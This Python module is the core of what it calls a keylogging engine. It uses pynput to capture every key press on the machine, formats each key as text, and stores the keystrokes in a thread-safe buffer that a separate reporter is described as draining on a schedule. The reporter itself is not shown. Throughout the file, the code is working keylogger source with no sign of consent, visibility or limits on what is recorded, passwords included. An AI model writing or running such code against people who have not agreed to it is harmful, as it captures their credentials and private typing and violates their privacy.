"""Core keylogging engine.

Provides:

* ``format_key``       — pure function turning a pynput key event into text.
                        Never raises, even for unknown or non-character keys.
* ``KeystrokeBuffer``  — thread-safe accumulation of formatted keystrokes.
                        Written to by the pynput callback thread and drained
                        by the reporter thread/task without races.
* ``KeyListener``      — thin, safe wrapper around ``pynput.keyboard.Listener``
                        with graceful start/stop and optional error hook.
"""

from __future__ import annotations

import logging
import threading
from typing import Callable, Optional

import pynput.keyboard as _keyboard

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Key formatting
# ---------------------------------------------------------------------------

#: Human-readable labels for special (non-character) keys.
#: Keys that produce literal text (space, enter, tab) map to their raw text;
#: everything else maps to a bracketed token.
_SPECIAL_KEYS: dict[str, str] = {
    "space": " ",
    "enter": "\n",
    "tab": "\t",
    "backspace": "[BACKSPACE] ",
    "delete": "[DELETE] ",
    "insert": "[INSERT] ",
    "esc": "[ESC] ",
    "caps_lock": "[CAPS_LOCK] ",
    "num_lock": "[NUM_LOCK] ",
    "scroll_lock": "[SCROLL_LOCK] ",
    "print_screen": "[PRINT_SCREEN] ",
    "pause": "[PAUSE] ",
    "menu": "[MENU] ",
    "home": "[HOME] ",
    "end": "[END] ",
    "page_up": "[PAGE_UP] ",
    "page_down": "[PAGE_DOWN] ",
    "up": "[UP] ",
    "down": "[DOWN] ",
    "left": "[LEFT] ",
    "right": "[RIGHT] ",
    "ctrl": "[CTRL] ",
    "ctrl_l": "[CTRL] ",
    "ctrl_r": "[CTRL] ",
    "shift": "[SHIFT] ",
    "shift_l": "[SHIFT] ",
    "shift_r": "[SHIFT] ",
    "alt": "[ALT] ",
    "alt_l": "[ALT] ",
    "alt_r": "[ALT] ",
    "alt_gr": "[ALT_GR] ",
    "cmd": "[CMD] ",
    "cmd_l": "[CMD] ",
    "cmd_r": "[CMD] ",
}

for _i in range(1, 13):
    _SPECIAL_KEYS[f"f{_i}"] = f"[F{_i}] "

#: Fallback label for anything we cannot identify.
_UNKNOWN = "[UNKNOWN] "


def format_key(key: object) -> str:
    """Return the display text for a single key event.

    The function is defensive by design: unknown keys, ``None`` characters
    and unexpected objects all produce a label instead of raising, so a
    single weird key can never take the whole logger down.
    """
    # Character keys: KeyCode instances expose ``char``.
    char = getattr(key, "char", None)
    if char is not None:
        # Some platforms report carriage return for Enter.
        if char == "\r":
            return "\n"
        return char

    # Special keys: pynput's Key enum members expose ``name``.
    name = getattr(key, "name", None)
    if name is not None:
        return _SPECIAL_KEYS.get(name, f"[{name.upper()}] ")

    # KeyCode without a character (e.g. media keys): expose ``vk``.
    vk = getattr(key, "vk", None)
    if vk is not None:
        return f"[VK:{vk}] "

    return _UNKNOWN


# ---------------------------------------------------------------------------
# Thread-safe buffer
# ---------------------------------------------------------------------------

class KeystrokeBuffer:
    """Thread-safe accumulation of keystroke text.

    The pynput callback thread calls :meth:`append` for every key press;
    the reporter calls :meth:`drain` on its own schedule.  ``drain``
    atomically removes everything collected so far, so a report interval
    never overlaps with the next one.
    """

    def __init__(self) -> None:
        self._chunks: list[str] = []
        self._lock = threading.Lock()

    def append(self, text: str) -> None:
        """Append a formatted keystroke (called from the pynput thread)."""
        if not text:
            return
        with self._lock:
            self._chunks.append(text)

    def drain(self) -> str:
        """Return and clear all buffered keystrokes."""
        with self._lock:
            if not self._chunks:
                return ""
            text = "".join(self._chunks)
            self._chunks = []
        return text

    @property
    def size(self) -> int:
        """Number of characters currently buffered."""
        with self._lock:
            return sum(len(c) for c in self._chunks)

    def __bool__(self) -> bool:
        return self.size > 0


# ---------------------------------------------------------------------------
# Listener wrapper
# ---------------------------------------------------------------------------

class KeyListener:
    """Safe wrapper around a pynput keyboard listener.

    Exceptions raised by pynput's callback thread are logged instead of
    being silently swallowed, and the listener can be started and stopped
    repeatedly without leaking threads.
    """

    def __init__(self, on_error: Optional[Callable[[Exception], None]] = None) -> None:
        self.buffer = KeystrokeBuffer()
        self._listener: Optional[_keyboard.Listener] = None
        self._started = False
        self._on_error = on_error

    def _handle_press(self, key: object) -> None:
        try:
            self.buffer.append(format_key(key))
        except Exception as exc:  # pragma: no cover - defensive
            logger.error("Failed to process key event %r: %s", key, exc)
            if self._on_error is not None:
                self._on_error(exc)

    def start(self) -> bool:
        """Start listening. Returns True if this call started the listener."""
        if self._started:
            return False
        try:
            self._listener = _keyboard.Listener(on_press=self._handle_press)
            self._listener.start()
            self._started = True
            logger.info("Keyboard listener started")
            return True
        except Exception as exc:  # pragma: no cover - platform dependent
            logger.error("Failed to start keyboard listener: %s", exc)
            if self._on_error is not None:
                self._on_error(exc)
            return False

    def stop(self) -> None:
        """Stop listening and join the listener thread."""
        if not self._started:
            return
        try:
            if self._listener is not None:
                self._listener.stop()
                self._listener.join(timeout=2.0)
        except Exception as exc:  # pragma: no cover - defensive
            logger.error("Error while stopping keyboard listener: %s", exc)
        finally:
            self._started = False
            self._listener = None
            logger.info("Keyboard listener stopped")

    @property
    def running(self) -> bool:
        return self._started
